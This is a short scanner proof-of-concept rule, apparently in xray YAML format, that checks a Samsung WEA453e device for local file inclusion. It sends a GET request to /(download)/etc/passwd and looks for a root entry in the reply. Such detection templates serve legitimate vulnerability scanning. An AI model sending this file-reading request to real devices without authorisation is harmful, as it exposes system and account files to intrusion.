name: poc-yaml-samsung-wea453e-lfi
set:
  r1: randomInt(40000, 44800)
  r2: randomInt(1140000, 1144800)
rules:
  - method: GET
    path: /(download)/etc/passwd
    follow_redirects: false
    expression: |
      response.status == 200 && "root:.*:0:0:".bmatches(response.body)
